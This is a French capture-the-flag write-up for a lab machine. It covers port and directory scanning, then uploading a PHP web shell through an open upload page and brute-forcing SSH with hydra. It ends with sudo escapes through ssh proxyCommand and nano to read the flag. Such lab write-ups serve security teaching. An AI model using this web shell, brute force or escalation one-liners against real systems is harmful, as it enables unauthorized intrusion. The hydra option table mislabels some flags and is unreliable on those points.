# Write-up CTF Facile 1 

## Etape 1 :  Analyser le Réseau

Premièrement on effectue une analyse du réseau de la machine afin de voir quels ports sont ouverts : 

```bash
nmap 172.30.150.47
```

Résultat :

![Resultat nmap](1.PNG)

On constate qu'il y a le port SSH d'ouvert et un service web, allons voir de ce coté ! 

![Resultat nmap](2.PNG)

On constate que c'est la page par défaut de Apache, nous allons voir s'il n'y a pas des fichiers ou des redirections cachées avec l'outil ` gobuster `

```sh
gobuster dir -u http://172.30.150.47/ -w /usr/share/wordliste/dirbuster/directory-list-2.3-medium.txt -x .php,.html -t 40
```

| Paramètre | Signification |
|------------|---------------|
| -u          |   url du site          |
| -w          |   liste de mots à utiliser             |
| -x          |  extensions de fichier à regarder              |


Il y a 3 url possibles et accessibles. uploads/ qui est un répertoire, upload.php, et index.html sur lequel nous sommes déjà. Allons voir du côté de upload.php.

![Resultat nmap](3.PNG)

Nous arrivons sur une page basique où nous pouvons upload des fichiers. On va voir s'il accepte des scripts php ou fait attention à l'extension du fichier. 

![Resultat nmap](4.PNG)

## Etape 2 : Exécution de commandes sur le système

On va essayer d'upload le script php suivant, qui permettra d'effectuer des commandes bash dans l'URL du site, pour voir si cela fonctionne.

```php
<?php echo "<pre>"; system($_GET["cmd"]); _halt_compiler() ?>
```
On se rend compte que cela fonctionne, comme montré sur la capture d'écran ci-dessous. 

![Resultat nmap](5.PNG)

On voit qu'il y a 3 utilisateurs qu'on va devoir attaquer de par leur nom. (ctf-challenge)

## Etape 3 : Brute Force de connexion SSH

On va essayer de bruteforce le premier utilisateur via hydra : 

```sh
hydra -l ctf-challenge-01 -P /usr/share/wordlist/rockyou.txt -f -t 50 -V 172.30.150.47 ssh
```

| Paramètre | Signification |
|------------|---------------|
| -l         |   nom d'utilisateur         |
| -p          |   liste de mots à utiliser             |
| -f          |  se stoppe dès qu'il a trouvé le mdp              |
| -t         |  nombre de threads           |
| -V         |  URL         |

On trouve ainsi le mot de passe `hellokitty`, et on peut se connecter en SSH.

![Resultat nmap](6.PNG)

## Etape 4 : Elévation des privilèges

On regarde si par hasard on ne pourrait pas exécuter des commandes avec `sudo`. On se rend compte que l'on peut utiliser des commandes `sudo /bin/ssh` via l'utilisateur **ctf-challenge-01-1**. Après une recherche Internet, on trouve l'exploit suivant :

```sh
sudo -u ctf-challenge-01-1 /bin/ssh -o proxyCommand=';sh 0<&2 1>&2' x
```

On arrive donc sur le terminal en tant que **ctf-challenge-01-1**, et on refait la même procédure avec le `sudo -l`

![Resultat nmap](7.PNG)

Cette fois-ci, on peut exécuter en tant que **ctf-challenge-01-2** via `sudo` la commande `sudo /bin/nano`. On va essayer d'ouvrir des fichiers, notament un fichier ***flag.txt***, que l'on retrouve sur le home de l'utilisateur **ctf-challenge-01**, et on obient ainsi le flag.

La commande a excécuter : 

```sh
sudo -u ctf-challenge-01-2 /bin/nano /home/ctf-challenge-01/flag.txt
```

![Resultat nmap](8.PNG)